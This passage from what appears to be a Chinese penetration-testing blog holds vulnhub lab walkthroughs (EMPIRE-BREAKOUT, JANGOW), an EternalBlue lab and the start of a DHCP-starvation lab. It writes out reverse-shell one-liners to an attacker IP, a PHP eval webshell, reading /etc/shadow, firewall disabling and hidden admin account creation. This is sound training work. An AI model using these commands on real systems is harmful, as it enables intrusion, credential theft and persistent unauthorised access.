alt="Untitled"></p><p>我们用burp试试，提交的时候抓包，将Content-Type:后面的类型改为<code>image/jpeg</code> 顺手在文件内容前面加上<code>GIF89A</code> （保险）</p><p><img src="Untitled%2024.png" alt="Untitled"></p><p>提交，失败</p><p><img src="Untitled%2025.png" alt="Untitled"></p><p>我们切换到新建的用户中，发现有一个上传文件的地方</p><p><img src="Untitled%2026.png" alt="Untitled"></p><p>上传一个php文件试试</p><p><img src="Untitled%2027.png" alt="Untitled"></p><p>此时在<code>/uploads/attachments/</code>页面发现php文件了</p><p><img src="Untitled%2028.png" alt="Untitled"></p><p>之后用同样的方式，上传msf生成的php</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p>上传之后使用<code>msfconsole</code>进入msf，使用相同的payload监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2029.png" alt="Untitled"></p><p>监听，<code>run</code></p><p>访问刚刚上传的webshell文件，成功</p><p><img src="Untitled%2030.png" alt="Untitled"></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>查看可以具有SUID权限的文件，我们发现有一个<code>/opt/get_access</code> 很可疑</p><p><img src="Untitled%2031.png" alt="Untitled"></p><p>运行一下</p><p><img src="Untitled%2032.png" alt="Untitled"></p><p>使用命令strings 命令查看一下,文件中的可打印字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /opt/get_access</span><br></pre></td></tr></table></figure><p><img src="Untitled%2033.png" alt="Untitled"></p><p>然后我们在其中可以发现，这个程序运行的时候，可以以root权限执行<code>cat</code>命令，因此这里的思路是</p><ul><li>将环境变量中的cat修改为我们的自己建立的<code>cat</code></li></ul><p>这样当运行这个文件的时候，就可以运行我们的<code>cat</code>了</p><h3 id="创建新的cat"><a href="#创建新的cat" class="headerlink" title="创建新的cat"></a>创建新的cat</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/cat</span><br></pre></td></tr></table></figure><p>将<code>/bin/bash</code>写入<code>/tmp/cat</code>文件中，这样以<code>root</code>权限运行时，就会将<code>root</code>的/<code>bin/bash</code>反弹回来</p><p>并赋予其可执行权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/cat</span><br></pre></td></tr></table></figure><h3 id="增加环境变量"><a href="#增加环境变量" class="headerlink" title="增加环境变量"></a>增加环境变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p>可以将/tmp/cat的路径加入到PATH，从而可以在任何地方直接使用hello命令。并且对所有用户生效</p><h3 id="运行get-access"><a href="#运行get-access" class="headerlink" title="运行get_access"></a>运行get_access</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/get_access</span><br></pre></td></tr></table></figure><p>见证奇迹的时刻，<code>whoami</code></p><p><img src="Untitled%2034.png" alt="Untitled"></p><h2 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h2><h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICA&#123;Next_Generation_Self_Renewable_Genetics&#125;</span><br></pre></td></tr></table></figure><h3 id="home-travis"><a href="#home-travis" class="headerlink" title="/home/travis"></a>/home/travis</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ICA&#123;Secret_Project&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』EMPIRE-BREAKOUT</title>
      <link href="/2024/05/17/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEMPIRE-BREAKOUT/"/>
      <url>/2024/05/17/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FEMPIRE-BREAKOUT/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』EMPIRE-BREAKOUT"><a href="#『vulnhub系列』EMPIRE-BREAKOUT" class="headerlink" title="『vulnhub系列』EMPIRE-BREAKOUT"></a>『vulnhub系列』EMPIRE-BREAKOUT</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/empire-breakout,<span class="number">751</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用nmap扫描内网存活主机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口发现apache默认页面</p><p>在网页源代码中找到提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">don<span class="string">&#x27;t worry no one will get here, it&#x27;</span>s safe to share <span class="keyword">with</span> you my access. Its encrypted :)</span><br><span class="line"></span><br><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>根据多年<strong>前</strong>的ctf经验，发现这是<strong>Brainfuck/OoK加密解密</strong><a href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 - Bugku CTF</a>，在相应网站进行解密得到一串字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文：++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line">明文：<span class="number">.2</span>uqPEfj3D&lt;P<span class="string">&#x27;a-3</span></span><br></pre></td></tr></table></figure><p>使用工具enum4linux枚举用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -r <span class="number">192.168</span><span class="number">.0</span><span class="number">.134</span></span><br></pre></td></tr></table></figure><p>发现存在用户cyber</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>访问10000端口，发现登陆页面</p><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问20000端口，发现登录页面</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>使用<code>cyber:.2uqPEfj3D&lt;P&#39;a-3</code> 登录20000端口，进入页面</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>进入到Usermin页面，发现命令行</p><p><img src="Untitled%205.png" alt="Untitled"></p><p><code>ls</code> 查看当前目录</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>使用命令<code>cat user.txt</code> 得到普通flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先在攻击机监听4444端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>此时我们在网页端的命令行界面反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">192.168</span><span class="number">.0</span><span class="number">.130</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>成功</p><p><img src="Untitled%207.png" alt="Untitled"></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>使用<code>ls -l</code>发现，存在一个tar文件，并且具有root权限</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>使用命令<code>getcap tar</code> 查看，发现文件存在CAP_DAC_READ_SEARCH权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAP_DAC_READ_SEARCH:忽略文件读及目录搜索的DAC访问限制</span><br></pre></td></tr></table></figure><p>因此我们可以使用tar跨越目录来解压缩文件</p><p>试验，我们甚至可以将shadow，复制过来，然后读取</p><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf shadow.rar /etc/shadow <span class="comment">#使用当前目录的tar压缩/etc/shadow文件</span></span><br><span class="line">./tar -xvf shadow.rar</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure><p>一开始是想使用john对shadow进行暴力破解的，但多少有些不现实</p><p>于是就使用<code>ls -la</code>对目录进行地毯式搜索</p><p>于是在<code>/var/backups</code>中找到一个隐藏文件<code>.old_pass.bak</code></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>并且使用cat命令，无法访问</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>所以这个文件很可疑啊，使用<code>tar</code>拿出来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf backup.tar /var/backups/.old_pass.bak</span><br><span class="line">./tar -xvf backup.tar</span><br><span class="line">cd var/backups</span><br><span class="line">cat .old_pass.bak</span><br></pre></td></tr></table></figure><p>发现有一串跟之前的密码很像的字符串</p><p><img src="Untitled%2011.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ts&amp;<span class="number">4</span>&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure><p>此时我们切换root用户试一试，成功</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>使用pyhton开启交互式shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyhton3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2013.png" alt="Untitled"></p><p><code>cd</code> 之后<code>cat rOOt.txt</code> 获得最后的flag</p><p><img src="Untitled%2014.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br></pre></td></tr></table></figure><p>顺便给大家看看，这边还暴力破解着呢</p><p><img src="Untitled%2015.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』JANGOW</title>
      <link href="/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/"/>
      <url>/2024/05/09/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FJANGOW/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』JANGOW-1-0-1"><a href="#『vulnhub系列』JANGOW-1-0-1" class="headerlink" title="『vulnhub系列』JANGOW: 1.0.1"></a>『vulnhub系列』JANGOW: 1.0.1</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/jangow-101,754/</span><br></pre></td></tr></table></figure><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><p>发现不能获取ip地址</p><p>我们来到初始页面按e，将linux后面的<code>ro</code>改为<code>rw single init=/bin/bash</code> </p><p>然后Ctrl+x重启进入如下界面</p><p><img src="Untitled.png" alt="Untitled"></p><p><code>ip a</code> 查看网卡，发现是ens33</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>修改配置文件<code>nano /etc/network/interfaces</code> </p><p><img src="Untitled%202.png" alt="Untitled"></p><p>将下列两个enp0s17修改为ens33</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>重启，使用nmap扫描，成功获取IP地址</p><p><img src="Untitled%204.png" alt="Untitled"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>由刚才的扫描结果可知，这个机器开启了80端口，访问一下</p><p><img src="Untitled%205.png" alt="Untitled"></p><p>使用dirsearch扫描目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.133/&quot;</span></span><br></pre></td></tr></table></figure><p>发现了刚刚访问的site目录和<code>.backup</code>文件</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>访问一下<code>.backup</code> 发现数据库信息（数据库名，用户名，密码）</p><p><img src="Untitled%207.png" alt="Untitled"></p><p>乱点发现代码执行</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>使用命令执行，写入一句话木马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span> &gt;&gt; shell.php</span><br></pre></td></tr></table></figure><p>使用ls查看，成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>使用蚁剑连接</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>在wordpass目录发现新的配置文件</p><p><img src="Untitled%2011.png" alt="Untitled"></p><p>使用ftp登录，用两个用户登录，注意！！！：密码是abygurl69，这里是l是字母，不是数字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.133</span><br></pre></td></tr></table></figure><p>我们可以发现/etc/passwd中有jangow01用户</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>使用jangow01登陆成功</p><p><img src="Untitled%2013.png" alt="Untitled"></p><p><code>ls -al</code>但是发现啥都没有</p><p><img src="Untitled%2014.png" alt="Untitled"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用命令执行漏洞或者使用蚁剑在site目录下写入反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    system(<span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.130 443 &gt;/tmp/f&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2015.png" alt="Untitled"></p><p>在攻击机进行监听，好像只能在443端口完成反弹……</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>使用python获取交互式shell，并尝试切换jangow01用户，成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">su jangow01</span><br><span class="line">abygurl69</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>使用命令<code>uname -a</code> 查看系统内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux jangow01 4.4.0-31-generic <span class="comment">#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>然后查找相应的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0-31</span><br></pre></td></tr></table></figure><p><img src="Untitled%2018.png" alt="Untitled"></p><p>下载47170.c,注意：先不要在攻击机上编译，可能会出现问题，直接把.c文件上传到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 47170.c</span><br></pre></td></tr></table></figure><p>可以使用python搭建服务器将exp传到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="Untitled%2019.png" alt="Untitled"></p><p>在靶机使用wget下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.0.130:8000/exp</span><br></pre></td></tr></table></figure><p>使用ftp传输，登录ftp成功后先进入jingow01的目录，然后上传exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/jangow01</span><br><span class="line">put 45010.c</span><br></pre></td></tr></table></figure><p>进入jungow01目录查看，已经存在，并进行编译生成exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o exp</span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>执行exp，<code>./exp</code> ,成功</p><p><img src="Untitled%2021.png" alt="Untitled"></p><p>进入root目录查看，渗透完成</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>查看进入root目录查看</p><p><img src="Untitled%2023.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝实验</title>
      <link href="/2024/05/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/05/08/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="永恒之蓝实验"><a href="#永恒之蓝实验" class="headerlink" title="永恒之蓝实验"></a>永恒之蓝实验</h1><p>我们通过永恒之蓝漏洞的利用来复现一下到提权和权限维持的windows渗透思路</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先扫描局域网内存活主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>之后使用nmap扫描132主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.132</span><br></pre></td></tr></table></figure><p><img src="Untitled%201.png" alt="Untitled"></p><p>发现目标开启了445端口，可以利用永恒之蓝，进入msfconsole</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>扫描msf17-010</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure><p><img src="Untitled%203.png" alt="Untitled"></p><p>我们使用第一个，然后查看配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="Untitled%204.png" alt="Untitled"></p><p>设置目标IP和payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost 192.168.0.132</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>成功，进入shell并修改编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid <span class="comment">#获取system权限</span></span><br><span class="line">shell</span><br><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**netsh advfirewall <span class="built_in">set</span> currentprofile state off</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> privateprofile state off**</span><br></pre></td></tr></table></figure><p><img src="Untitled%206.png" alt="Untitled"></p><p>开启3389</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>查看端口 <code>netstat -an</code> ，开启成功</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>创建用户，并给用户赋予管理员权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user admin$ Test123 /add</span><br><span class="line">net localgroup Administrators admin$ /add</span><br></pre></td></tr></table></figure><p>远程桌面连接，成功</p><p><img src="Untitled%209.png" alt="Untitled"></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>可以结合之前的影子账户，完成后续的操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP饿死攻击及防御(基于ENSP模拟器、Kali攻击机实现)</title>
      <link href="/2024/04/25/DHCP%E9%A5%BF%E6%AD%BB%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1(%E5%9F%BA%E4%BA%8EENSP%E6%A8%A1%E6%8B%9F%E5%99%A8%E3%80%81Kali%E6%94%BB%E5%87%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0)/"/>
      <url>/2024/04/25/DHCP%E9%A5%BF%E6%AD%BB%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1(%E5%9F%BA%E4%BA%8EENSP%E6%A8%A1%E6%8B%9F%E5%99%A8%E3%80%81Kali%E6%94%BB%E5%87%BB%E6%9C%BA%E5%AE%9E%E7%8E%B0)/</url>
      
        <content type="html"><![CDATA[<h1 id="DHCP饿死攻击及防御-基于ENSP模拟器、Kali攻击机实现"><a href="#DHCP饿死攻击及防御-基于ENSP模拟器、Kali攻击机实现" class="headerlink" title="DHCP饿死攻击及防御(基于ENSP模拟器、Kali攻击机实现)"></a>DHCP饿死攻击及防御(基于ENSP模拟器、Kali攻击机实现)</h1><h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img src="Untitled.png" alt="Untitled"></p><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><ul><li>通过配置DHCP_Server，使得192.168.0.0/24子网内的终端能够自动获取IP地址及DNS</li><li>通过配置SW交换机，开启DHCP Snooping功能，用于保证DHCP客户端从合法的DHCP服务器获取IP地址</li><li>Kali攻击机接入192.168.0.0/24内网中，获取内网IP地址，使用两种DHCP攻击方式并抓包进行分析(Wireshark)</li></ul><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p><strong>0.准备工具dhcpstarv，yesinia</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dhcpstarv</span><br><span class="line">apt-get install yesinia</span><br><span class="line">图形界面打不开</span><br></pre></td></tr></table></figure><p><strong>1.配置dhcp服务器</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">R3配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">int</span> g0/<span class="number">0</span>/<span class="number">0</span></span><br><span class="line">ip address <span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span> <span class="number">24</span></span><br><span class="line">q</span><br><span class="line"></span><br><span class="line">ip pool <span class="number">1</span></span><br><span class="line">network <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">gateway-<span class="built_in">list</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.254</span></span><br><span class="line"></span><br><span class="line">dhcp enable</span><br><span class="line"><span class="built_in">int</span> g0/<span class="number">0</span>/<span class="number">0</span></span><br><span class="line">dhcp select <span class="keyword">global</span></span><br></pre></td></tr></table></figure><p>此时PC已经获取到IP地址</p><p><img src="Untitled%201.png" alt="Untitled"></p><p><strong>2.关闭kali的dhcp，从ensp中获取ip地址</strong></p><p>关闭kali的本地dhcp功能</p><p><img src="Untitled%202.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">kali配置</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dhcpclient</span><br></pre></td></tr></table></figure><p>获取到ip地址</p><p><img src="Untitled%203.png" alt="Untitled"></p><p><img src="Untitled%204.png" alt="Untitled"></p><p>此时可以在R3中看到地址池的使用情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">display ip pool name <span class="number">1</span> used</span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p><strong>3.使用工具dhcpstarv攻击</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">kali</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">dhcpstarv -v -i eth0 </span><br></pre></td></tr></table></figure><p>可以发现kali疯狂发送discover报文申请IP地址</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>DHCP服务器的地址池已经都被占用了</p><p><img src="Untitled%207.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 